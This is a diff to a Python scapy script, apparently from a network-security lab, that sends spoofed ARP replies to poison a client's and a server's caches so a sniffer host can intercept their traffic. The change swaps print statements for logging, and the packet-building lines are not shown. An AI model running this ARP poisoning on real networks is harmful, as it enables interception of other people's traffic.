@@ -1,7 +1,8 @@
-import time
+import time, logging
 from scapy.all import ARP, sendp, Ether, get_if_hwaddr
 
-def run_spoofer(interface, ip_dist):
+
+def run_spoofer(interface, ip_dist, logger):
   for ip, info in ip_dist.items():
     if info['name'] == 'client':
       client_ip = ip
@@ -28,15 +29,16 @@ def run_spoofer(interface, ip_dist):
     psrc=client_ip,
     hwsrc=sniffer_mac
   )
-  print("[Sniffer Log] [+] Started sending spoofed ARP replies in the background.")
+  logger.info("[+] Started sending spoofed ARP replies in the background.")
 
   try:
     for i in range(10):
       sendp(arp_to_client, iface=interface, verbose=False)
       sendp(arp_to_server, iface=interface, verbose=False)
       time.sleep(2)
+    logger.info("[+] Complete to send 10 spoofed ARP replies.")
   except KeyboardInterrupt:
-      print("\n[Sniffer Log] [*] Stopping ARP poisoner.")
+      logger.info("[*] Stopping ARP poisoner.")
 
 if __name__ == "__main__":
    run_spoofer()
